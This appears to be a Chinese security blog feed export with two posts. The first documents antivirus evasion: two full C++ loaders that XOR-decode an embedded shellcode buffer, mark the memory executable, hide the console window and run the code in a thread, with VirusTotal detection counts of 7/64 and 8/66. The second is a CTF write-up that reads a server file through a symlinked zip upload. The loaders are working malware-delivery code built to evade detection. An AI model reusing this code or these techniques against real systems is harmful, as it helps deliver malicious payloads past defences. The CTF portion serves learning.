class="string">&quot;\xed\x59\x92\xf5\xe1\xf9\xd9\x11\x11\x11\x50\x40\x50\x41\x43\x40\x47\x59\x20\xc3\x74\x59\x9a\x43\x71\x59\x9a\x43\x09\x59\x9a\x43\x31\x59\x9a\x63\x41\x59\x1e\xa6\x5b\x5b\x5c\x20\xd8\x59\x20\xd1\xbd\x2d\x70\x6d\x13\x3d\x31\x50\xd0\xd8\x1c\x50\x10\xd0\xf3\xfc\x43\x50\x40\x59\x9a\x43\x31\x9a\x53\x2d\x59\x10\xc1\x77\x90\x69\x09\x1a\x13\x64\x63\x9a\x91\x99\x11\x11\x11\x59\x94\xd1\x65\x76\x59\x10\xc1\x41\x9a\x59\x09\x55\x9a\x51\x31\x58\x10\xc1\xf2\x47\x59\xee\xd8\x50\x9a\x25\x99\x59\x10\xc7\x5c\x20\xd8\x59\x20\xd1\xbd\x50\xd0\xd8\x1c\x50\x10\xd0\x29\xf1\x64\xe0\x5d\x12\x5d\x35\x19\x54\x28\xc0\x64\xc9\x49\x55\x9a\x51\x35\x58\x10\xc1\x77\x50\x9a\x1d\x59\x55\x9a\x51\x0d\x58\x10\xc1\x50\x9a\x15\x99\x59\x10\xc1\x50\x49\x50\x49\x4f\x48\x4b\x50\x49\x50\x48\x50\x4b\x59\x92\xfd\x31\x50\x43\xee\xf1\x49\x50\x48\x4b\x59\x9a\x03\xf8\x5e\xee\xee\xee\x4c\x7b\x11\x58\xaf\x66\x78\x7f\x78\x7f\x74\x65\x11\x50\x47\x58\x98\xf7\x5d\x98\xe0\x50\xab\x5d\x66\x37\x16\xee\xc4\x59\x20\xd8\x59\x20\xc3\x5c\x20\xd1\x5c\x20\xd8\x50\x41\x50\x41\x50\xab\x2b\x47\x68\xb6\xee\xc4\xfa\x62\x4b\x59\x98\xd0\x50\xa9\x41\x11\x11\x11\x5c\x20\xd8\x50\x40\x50\x40\x7b\x12\x50\x40\x50\xab\x46\x98\x8e\xd7\xee\xc4\xfa\x48\x4a\x59\x98\xd0\x59\x20\xc3\x58\x98\xc9\x5c\x20\xd8\x43\x79\x11\x13\x51\x95\x43\x43\x50\xab\xfa\x44\x3f\x2a\xee\xc4\x59\x98\xd7\x59\x92\xd2\x41\x7b\x1b\x4e\x59\x98\xe0\x59\x98\xcb\x58\xd6\xd1\xee\xee\xee\xee\x5c\x20\xd8\x43\x43\x50\xab\x3c\x17\x09\x6a\xee\xc4\x94\xd1\x1e\x94\x8c\x10\x11\x11\x59\xee\xde\x1e\x95\x9d\x10\x11\x11\xfa\xc2\xf8\xf5\x10\x11\x11\xf9\xb3\xee\xee\xee\x3e\x5e\x78\x53\x72\x11\x2a\xab\x16\xdb\x1f\x60\x28\x5c\xe5\x62\xb1\x74\x71\xad\x51\x34\xb1\x06\x40\xa2\xdd\xf4\x68\x3e\xea\x31\x08\xb9\x0b\x49\x69\x75\x5f\xe6\x03\xfe\x0c\x1f\xfd\xf0\xe4\x74\x06\xd4\x3e\xf6\x93\xaa\x4f\x88\xb2\x41\x9a\x35\x9a\x8d\xe7\x05\xfa\x92\x5c\x94\x14\x94\x99\xe2\x1d\x90\xa0\x7b\x4b\x6c\x6a\x11\x44\x62\x74\x63\x3c\x50\x76\x74\x7f\x65\x2b\x31\x5c\x7e\x6b\x78\x7d\x7d\x70\x3e\x25\x3f\x21\x31\x39\x72\x7e\x7c\x61\x70\x65\x78\x73\x7d\x74\x2a\x31\x5c\x42\x58\x54\x31\x29\x3f\x21\x2a\x31\x46\x78\x7f\x75\x7e\x66\x62\x31\x5f\x45\x31\x27\x3f\x20\x2a\x31\x46\x5e\x46\x27\x25\x2a\x31\x45\x63\x78\x75\x74\x7f\x65\x3e\x25\x3f\x21\x2a\x31\x42\x5d\x52\x52\x23\x2a\x31\x3f\x5f\x54\x45\x31\x52\x5d\x43\x31\x23\x3f\x21\x3f\x24\x21\x26\x23\x26\x38\x1c\x1b\x11\x78\x8a\xf1\x6f\xa3\xa7\x29\x7b\xad\x72\x4f\xe8\x94\x8d\x33\x75\x06\x51\x4b\x26\x67\xf1\x71\x15\x45\xe2\x7b\x74\x1a\x7f\x0f\x81\x96\xa8\xfa\xe8\x94\x1a\x33\xc6\x75\x51\x6d\x67\x45\xc7\x36\x6d\x09\x3d\x86\x56\x4c\x1d\x42\x9f\xd9\xfd\xdd\x11\xcf\xec\xf9\x76\x91\xaa\xf4\xd7\x70\x05\x02\x2d\x30\x5f\x17\xe8\xc8\x30\xb6\x8c\x5f\x72\xd9\x2a\xbf\x7f\xe3\xf2\x49\x38\x05\x8b\xa0\xfd\xcc\xd7\xf5\x73\xc1\x30\x6d\xf5\xde\x30\x40\xec\x07\x6e\xdc\xef\x79\xcd\xcb\x06\x0d\xe6\xba\x24\x68\x54\x20\x06\xe0\x21\xec\xcc\x5e\xec\x24\xde\x85\xbb\xac\xda\x02\x59\xc2\xb4\x3e\xa9\x89\xfc\x74\x45\x09\x24\xa3\x2d\x32\x0a\x9c\xa5\x1c\x73\xde\xf0\x8a\x6a\xf6\x72\x3b\x97\x9c\x07\xf5\xcb\xea\xb5\x12\x5a\x9f\x0f\x12\x12\xb2\x5c\x00\x0c\x3b\xaa\xd8\xf0\xae\xa1\xb4\x32\x1c\xc7\x7c\x25\x88\x11\x50\xaf\xe1\xa4\xb3\x47\xee\xc4\x59\x20\xd8\xab\x11\x11\x51\x11\x50\xa9\x11\x01\x11\x11\x50\xa8\x51\x11\x11\x11\x50\xab\x49\xb5\x42\xf4\xee\xc4\x59\x82\x42\x42\x59\x98\xf6\x59\x98\xe0\x59\x98\xcb\x50\xa9\x11\x31\x11\x11\x58\x98\xe8\x50\xab\x03\x87\x98\xf3\xee\xc4\x59\x92\xd5\x31\x94\xd1\x65\xa7\x77\x9a\x16\x59\x10\xd2\x94\xd1\x64\xc6\x49\x49\x49\x59\x14\x11\x11\x11\x11\x41\xd2\xf9\x8e\xec\xee\xee\x20\x28\x23\x3f\x20\x27\x29\x3f\x23\x25\x29\x3f\x20\x11\x40\x18\xae\x7c\x11&quot;</span>;</span><br><span class="line">    <span class="comment">// 获取shellcode大小</span></span><br><span class="line">     shellcode_size = <span class="built_in"><span class="keyword">sizeof</span></span>(buf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    VirtualAlloc(</span></span><br><span class="line"><span class="comment">        NULL, // 基址</span></span><br><span class="line"><span class="comment">        800,  // 大小</span></span><br><span class="line"><span class="comment">        MEM_COMMIT, // 内存页状态</span></span><br><span class="line"><span class="comment">        PAGE_EXECUTE_READWRITE // 可读可写可执行</span></span><br><span class="line"><span class="comment">        );</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">//shellcode xor后解密，密码为17,解密后使用virtualalloc分配虚拟内存</span></span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; shellcode_size; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        buf[i] = buf[i] ^ <span class="number">17</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">char</span>* shellcode = (<span class="keyword">char</span>*)<span class="built_in">VirtualAlloc</span>(</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        shellcode_size,</span><br><span class="line">        MEM_COMMIT,</span><br><span class="line">        PAGE_READWRITE</span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// 将shellcode复制到可执行的内存页中</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">CopyMemory</span>(shellcode, buf, shellcode_size);</span><br><span class="line">    <span class="built_in">VirtualProtect</span>(shellcode, shellcode_size, PAGE_EXECUTE, &amp;dwOldProtect);</span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">2000</span>);</span><br><span class="line">    hThread = <span class="built_in">CreateThread</span>(</span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 安全描述符</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 栈的大小</span></span><br><span class="line">        (LPTHREAD_START_ROUTINE)shellcode, <span class="comment">// 函数</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 参数</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 线程标志</span></span><br><span class="line">        &amp;dwThreadId <span class="comment">// 线程ID</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThread, INFINITE); <span class="comment">// 一直等待线程执行结束</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="免杀效果-8-66"><a href="#免杀效果-8-66" class="headerlink" title="免杀效果 8/66"></a>免杀效果 8/66</h2><p>b07db5b474a3e42e444299f28a71e6fd8d5cf808d91d2680e4bece8d4bd89fc4</p><p><img src="http://cdn.polowong.top/image-20211202152602331.png" alt="image-20211202152602331"></p><h1 id="简单加载器-修改内存页属性-sleep-shellcode-xor异或-去掉cmd黑框"><a href="#简单加载器-修改内存页属性-sleep-shellcode-xor异或-去掉cmd黑框" class="headerlink" title="简单加载器+修改内存页属性+sleep+shellcode xor异或+去掉cmd黑框"></a>简单加载器+修改内存页属性+sleep+shellcode xor异或+去掉cmd黑框</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">&quot;/INCREMENTAL:NO&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">&quot;/section:.data,RWE&quot;</span>)</span></span><br><span class="line"><span class="comment">// 入口函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, TCHAR* argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> shellcode_size = <span class="number">0</span>; <span class="comment">// shellcode长度</span></span><br><span class="line">    DWORD dwThreadId; <span class="comment">// 线程ID</span></span><br><span class="line">    HANDLE hThread; <span class="comment">// 线程句柄</span></span><br><span class="line">    DWORD dwOldProtect;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">&quot;\xed\x59\x92\xf5\xe1\xf9\xd9\x11\x11\x11\x50\x40\x50\x41\x43\x40\x47\x59\x20\xc3\x74\x59\x9a\x43\x71\x59\x9a\x43\x09\x59\x9a\x43\x31\x59\x9a\x63\x41\x59\x1e\xa6\x5b\x5b\x5c\x20\xd8\x59\x20\xd1\xbd\x2d\x70\x6d\x13\x3d\x31\x50\xd0\xd8\x1c\x50\x10\xd0\xf3\xfc\x43\x50\x40\x59\x9a\x43\x31\x9a\x53\x2d\x59\x10\xc1\x77\x90\x69\x09\x1a\x13\x64\x63\x9a\x91\x99\x11\x11\x11\x59\x94\xd1\x65\x76\x59\x10\xc1\x41\x9a\x59\x09\x55\x9a\x51\x31\x58\x10\xc1\xf2\x47\x59\xee\xd8\x50\x9a\x25\x99\x59\x10\xc7\x5c\x20\xd8\x59\x20\xd1\xbd\x50\xd0\xd8\x1c\x50\x10\xd0\x29\xf1\x64\xe0\x5d\x12\x5d\x35\x19\x54\x28\xc0\x64\xc9\x49\x55\x9a\x51\x35\x58\x10\xc1\x77\x50\x9a\x1d\x59\x55\x9a\x51\x0d\x58\x10\xc1\x50\x9a\x15\x99\x59\x10\xc1\x50\x49\x50\x49\x4f\x48\x4b\x50\x49\x50\x48\x50\x4b\x59\x92\xfd\x31\x50\x43\xee\xf1\x49\x50\x48\x4b\x59\x9a\x03\xf8\x5e\xee\xee\xee\x4c\x7b\x11\x58\xaf\x66\x78\x7f\x78\x7f\x74\x65\x11\x50\x47\x58\x98\xf7\x5d\x98\xe0\x50\xab\x5d\x66\x37\x16\xee\xc4\x59\x20\xd8\x59\x20\xc3\x5c\x20\xd1\x5c\x20\xd8\x50\x41\x50\x41\x50\xab\x2b\x47\x68\xb6\xee\xc4\xfa\x62\x4b\x59\x98\xd0\x50\xa9\x41\x11\x11\x11\x5c\x20\xd8\x50\x40\x50\x40\x7b\x12\x50\x40\x50\xab\x46\x98\x8e\xd7\xee\xc4\xfa\x48\x4a\x59\x98\xd0\x59\x20\xc3\x58\x98\xc9\x5c\x20\xd8\x43\x79\x11\x13\x51\x95\x43\x43\x50\xab\xfa\x44\x3f\x2a\xee\xc4\x59\x98\xd7\x59\x92\xd2\x41\x7b\x1b\x4e\x59\x98\xe0\x59\x98\xcb\x58\xd6\xd1\xee\xee\xee\xee\x5c\x20\xd8\x43\x43\x50\xab\x3c\x17\x09\x6a\xee\xc4\x94\xd1\x1e\x94\x8c\x10\x11\x11\x59\xee\xde\x1e\x95\x9d\x10\x11\x11\xfa\xc2\xf8\xf5\x10\x11\x11\xf9\xb3\xee\xee\xee\x3e\x5e\x78\x53\x72\x11\x2a\xab\x16\xdb\x1f\x60\x28\x5c\xe5\x62\xb1\x74\x71\xad\x51\x34\xb1\x06\x40\xa2\xdd\xf4\x68\x3e\xea\x31\x08\xb9\x0b\x49\x69\x75\x5f\xe6\x03\xfe\x0c\x1f\xfd\xf0\xe4\x74\x06\xd4\x3e\xf6\x93\xaa\x4f\x88\xb2\x41\x9a\x35\x9a\x8d\xe7\x05\xfa\x92\x5c\x94\x14\x94\x99\xe2\x1d\x90\xa0\x7b\x4b\x6c\x6a\x11\x44\x62\x74\x63\x3c\x50\x76\x74\x7f\x65\x2b\x31\x5c\x7e\x6b\x78\x7d\x7d\x70\x3e\x25\x3f\x21\x31\x39\x72\x7e\x7c\x61\x70\x65\x78\x73\x7d\x74\x2a\x31\x5c\x42\x58\x54\x31\x29\x3f\x21\x2a\x31\x46\x78\x7f\x75\x7e\x66\x62\x31\x5f\x45\x31\x27\x3f\x20\x2a\x31\x46\x5e\x46\x27\x25\x2a\x31\x45\x63\x78\x75\x74\x7f\x65\x3e\x25\x3f\x21\x2a\x31\x42\x5d\x52\x52\x23\x2a\x31\x3f\x5f\x54\x45\x31\x52\x5d\x43\x31\x23\x3f\x21\x3f\x24\x21\x26\x23\x26\x38\x1c\x1b\x11\x78\x8a\xf1\x6f\xa3\xa7\x29\x7b\xad\x72\x4f\xe8\x94\x8d\x33\x75\x06\x51\x4b\x26\x67\xf1\x71\x15\x45\xe2\x7b\x74\x1a\x7f\x0f\x81\x96\xa8\xfa\xe8\x94\x1a\x33\xc6\x75\x51\x6d\x67\x45\xc7\x36\x6d\x09\x3d\x86\x56\x4c\x1d\x42\x9f\xd9\xfd\xdd\x11\xcf\xec\xf9\x76\x91\xaa\xf4\xd7\x70\x05\x02\x2d\x30\x5f\x17\xe8\xc8\x30\xb6\x8c\x5f\x72\xd9\x2a\xbf\x7f\xe3\xf2\x49\x38\x05\x8b\xa0\xfd\xcc\xd7\xf5\x73\xc1\x30\x6d\xf5\xde\x30\x40\xec\x07\x6e\xdc\xef\x79\xcd\xcb\x06\x0d\xe6\xba\x24\x68\x54\x20\x06\xe0\x21\xec\xcc\x5e\xec\x24\xde\x85\xbb\xac\xda\x02\x59\xc2\xb4\x3e\xa9\x89\xfc\x74\x45\x09\x24\xa3\x2d\x32\x0a\x9c\xa5\x1c\x73\xde\xf0\x8a\x6a\xf6\x72\x3b\x97\x9c\x07\xf5\xcb\xea\xb5\x12\x5a\x9f\x0f\x12\x12\xb2\x5c\x00\x0c\x3b\xaa\xd8\xf0\xae\xa1\xb4\x32\x1c\xc7\x7c\x25\x88\x11\x50\xaf\xe1\xa4\xb3\x47\xee\xc4\x59\x20\xd8\xab\x11\x11\x51\x11\x50\xa9\x11\x01\x11\x11\x50\xa8\x51\x11\x11\x11\x50\xab\x49\xb5\x42\xf4\xee\xc4\x59\x82\x42\x42\x59\x98\xf6\x59\x98\xe0\x59\x98\xcb\x50\xa9\x11\x31\x11\x11\x58\x98\xe8\x50\xab\x03\x87\x98\xf3\xee\xc4\x59\x92\xd5\x31\x94\xd1\x65\xa7\x77\x9a\x16\x59\x10\xd2\x94\xd1\x64\xc6\x49\x49\x49\x59\x14\x11\x11\x11\x11\x41\xd2\xf9\x8e\xec\xee\xee\x20\x28\x23\x3f\x20\x27\x29\x3f\x23\x25\x29\x3f\x20\x11\x40\x18\xae\x7c\x11&quot;</span>;</span><br><span class="line">    <span class="comment">// 获取shellcode大小</span></span><br><span class="line">     shellcode_size = <span class="built_in"><span class="keyword">sizeof</span></span>(buf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    VirtualAlloc(</span></span><br><span class="line"><span class="comment">        NULL, // 基址</span></span><br><span class="line"><span class="comment">        800,  // 大小</span></span><br><span class="line"><span class="comment">        MEM_COMMIT, // 内存页状态</span></span><br><span class="line"><span class="comment">        PAGE_EXECUTE_READWRITE // 可读可写可执行</span></span><br><span class="line"><span class="comment">        );</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">//shellcode xor后解密，密码为17,解密后使用virtualalloc分配虚拟内存</span></span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; shellcode_size; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        buf[i] = buf[i] ^ <span class="number">17</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">char</span>* shellcode = (<span class="keyword">char</span>*)<span class="built_in">VirtualAlloc</span>(</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        shellcode_size,</span><br><span class="line">        MEM_COMMIT,</span><br><span class="line">        PAGE_READWRITE</span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// 将shellcode复制到可执行的内存页中</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">CopyMemory</span>(shellcode, buf, shellcode_size);</span><br><span class="line">    <span class="built_in">VirtualProtect</span>(shellcode, shellcode_size, PAGE_EXECUTE, &amp;dwOldProtect);</span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">2000</span>);</span><br><span class="line">    hThread = <span class="built_in">CreateThread</span>(</span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 安全描述符</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 栈的大小</span></span><br><span class="line">        (LPTHREAD_START_ROUTINE)shellcode, <span class="comment">// 函数</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 参数</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 线程标志</span></span><br><span class="line">        &amp;dwThreadId <span class="comment">// 线程ID</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThread, INFINITE); <span class="comment">// 一直等待线程执行结束</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="免杀效果VT-7-64"><a href="#免杀效果VT-7-64" class="headerlink" title="免杀效果VT 7/64"></a>免杀效果VT 7/64</h2><p><img src="http://cdn.polowong.top/image-20211202161158893.png" alt="image-20211202161158893"></p><p>a7a87509ad387960dedd08a609db3fe3c935cefc52b8ae97f5b761b1ac6ff7d3</p><h1 id="更新记录"><a href="#更新记录" class="headerlink" title="更新记录"></a>更新记录</h1><p>本次更新于2021.12.2，静态免杀效果VT 7/64，期末了，要准备期末考试，还要看论文，只能每天抽点时间去学相关知识。</p><h1 id="todo："><a href="#todo：" class="headerlink" title="todo："></a>todo：</h1><p>远程加载shellcode</p><p>更高级的shellcode混淆方法（对称加密）</p><p>ctf 隐写shellcode？</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;前言&lt;/p&gt;
&lt;p&gt;其实一直对免杀挺感兴趣的，但一直没有下定决心系统的学习，只是半路拿来别人写的过来用一下，所以这次想从最基本的方法开始学习免杀，作为一个记录贴将持续更新免杀方法、代码以及其中我没掌握的知识点。&lt;/p&gt;
&lt;/blockquote&gt;
</summary>
      
    
    
    
    
    <category term="免杀" scheme="https://polosec.github.io/tags/%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>一道简单的flask-web题</title>
    <link href="https://polosec.github.io/2021/11/25/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95%E7%9A%84flask-web%E9%A2%98/"/>
    <id>https://polosec.github.io/2021/11/25/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95%E7%9A%84flask-web%E9%A2%98/</id>
    <published>2021-11-25T07:36:34.000Z</published>
    <updated>2021-11-25T07:41:15.416Z</updated>
    
    <content type="html"><![CDATA[<p>PKU的一道简单flask web题 感觉挺有意思的<br>代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> shutil <span class="keyword">import</span> copyfile</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template,url_for,send_from_directory,make_response,redirect</span><br><span class="line"><span class="keyword">from</span> werkzeug.middleware.proxy_fix <span class="keyword">import</span> ProxyFix</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> jsonify</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> HTTPServer, SimpleHTTPRequestHandler</span><br><span class="line"></span><br><span class="line">os.environ[<span class="string">&#x27;TEMP&#x27;</span>]=<span class="string">&#x27;/dev/shm&#x27;</span></span><br><span class="line"></span><br><span class="line">app = Flask(<span class="string">&quot;access&quot;</span>)</span><br><span class="line">app.wsgi_app = ProxyFix(app.wsgi_app, x_for=<span class="number">1</span> ,x_proto=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        f=request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        os.system(<span class="string">&quot;rm -rf /dev/shm/zip/media/*&quot;</span>)</span><br><span class="line">        path=os.path.join(<span class="string">&quot;/dev/shm/zip/media&quot;</span>,<span class="string">&#x27;tmp.zip&#x27;</span>)<span class="comment"># 拼接文件路径</span></span><br><span class="line">        f.save(path)</span><br><span class="line">        os.system(<span class="string">&#x27;timeout -k 1 3 unzip /dev/shm/zip/media/tmp.zip -d /dev/shm/zip/media/&#x27;</span>)</span><br><span class="line">        os.system(<span class="string">&#x27;rm /dev/shm/zip/media/tmp.zip&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/media/&#x27;</span>)</span><br><span class="line">    response = render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/media/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/media&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/media/&lt;path&gt;&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">media</span>(<span class="params">path=<span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    npath=os.path.join(<span class="string">&quot;/dev/shm/zip/media&quot;</span>,path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(npath):</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&quot;404&quot;</span>,<span class="number">404</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(npath):</span><br><span class="line">        f=<span class="built_in">open</span>(npath,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">        response = make_response(f.read())</span><br><span class="line">        response.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;application/octet-stream&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        fn=os.listdir(npath)</span><br><span class="line">        fn=[<span class="string">&quot;..&quot;</span>]+fn</span><br><span class="line">        f=<span class="built_in">open</span>(<span class="string">&quot;templates/template.html&quot;</span>)</span><br><span class="line">        x=f.read()</span><br><span class="line">        f.close()</span><br><span class="line">        ret=<span class="string">&quot;&lt;h1&gt;文件列表:&lt;/h1&gt;&lt;br&gt;&lt;hr&gt;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> fn:</span><br><span class="line">            tpath=os.path.join(<span class="string">&#x27;/media/&#x27;</span>,path,i)</span><br><span class="line">            ret+=<span class="string">&quot;&lt;a href=&#x27;&quot;</span>+tpath+<span class="string">&quot;&#x27;&gt;&quot;</span>+i+<span class="string">&quot;&lt;/a&gt;&lt;br&gt;&quot;</span></span><br><span class="line">        x=x.replace(<span class="string">&quot;HTMLTEXT&quot;</span>,ret)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&#x27;mkdir /dev/shm/zip&#x27;</span>)</span><br><span class="line">os.system(<span class="string">&#x27;mkdir /dev/shm/zip/media&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">8080</span>,debug=<span class="literal">False</span>,threaded=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>大意为用户上传一个zip压缩包，服务器端解压后显示压缩包内的内容并且可以下载<img src="http://cdn.polowong.top/1637825858176qkyykata.png?imageslim" alt="paste image">类似这样。</p><p>我们可以利用Linux的软链接实现文件读取<img src="http://cdn.polowong.top/1637825912925e5ctiogo.png?imageslim" alt="paste image">下面制作一个存在软连接的zip压缩包</p><p>zip flag.zip flag –symlinks</p><p><img src="http://cdn.polowong.top/1637826007843qmy578le.png?imageslim" alt="paste image">直接下载文件得到读取的flag文件</p><p>flag{NeV3r_trUSt_Any_C0mprEsSEd_File}</p>]]></content>
    
    
      
      
